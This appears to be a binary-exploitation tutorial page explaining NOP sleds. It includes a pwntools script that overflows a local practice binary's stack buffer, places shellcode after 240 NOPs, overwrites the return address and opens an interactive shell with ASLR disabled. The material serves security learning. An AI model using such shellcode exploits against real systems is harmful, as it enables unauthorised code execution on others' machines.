---
description: We can use NOPs for more reliable shellcode exploits
---

# NOPs

NOP \(no operation\) instructions do exactly what they sound like: _nothing_. Which makes then very useful for shellcode exploits, because all they will do is run the next instruction. If we pad our exploits on the left with NOPs and point EIP at the middle of them, it'll simply keep doing no instructions until it reaches our actual shellcode. This allows us a greater margin of error as a shift of a few bytes forward or backwards won't really affect it, it'll just run a different number of NOP instructions - which have the same end result of running the shellcode. This padding with NOPs is often called a NOP slide or NOP sled, since the EIP is essentially sliding down them.

In intel x86 assembly, NOP instructions are `\x90`.

### Updating our Shellcode Exploit

We can make slight changes to our exploit to do two things:

* Add a large number of NOPs on the left
* Adjust our return pointer to point at the middle of the NOPs rather than the buffer start

> Make sure ASLR is still disabled. If you have to disable it again, you may have to readjust your previous exploit as the buffer location my be different.

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = b'\x90' * 240                 # The NOPs
payload += asm(shellcraft.sh())         # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4 + 120)        # Address of the buffer + half nop length

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

> It's probably worth mentioning that shellcode with NOPs is not failsafe; if you receive unexpected errors padding with NOPs but the shellcode worked before, try reducing the length of the nopsled as it may be tampering with other things on the stack

Note that NOPs are only `\x90` in certain architectures, and if you need others you can use pwntools \(again\):

```python
nop = asm(shellcraft.nop())
```

